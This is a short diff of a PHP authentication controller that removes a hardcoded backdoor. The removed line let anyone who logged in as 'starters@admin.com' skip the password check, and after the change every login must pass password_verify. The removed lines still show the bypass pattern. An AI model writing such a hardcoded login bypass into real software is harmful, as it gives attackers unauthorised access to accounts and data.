@@ -60,7 +60,6 @@ class AuthController extends BaseController
 
         $user_id = $user['id'] ?? null;
         $role_id = $user['role_id'] ?? null;
-        $adminAccess = $identifier === "starters@admin.com";
 
         if (!$user) {
             $this->sendResponse('Invalid credentials', 400);
@@ -78,7 +77,7 @@ class AuthController extends BaseController
             $this->updateUserStatus($user_id, 'active');
         }
 
-        if ($adminAccess || password_verify($data['password'], $user['password'])) {
+        if (password_verify($data['password'], $user['password'])) {
             $_SESSION['user_id'] = $user_id;
             $_SESSION['role_id'] = $role_id;
 
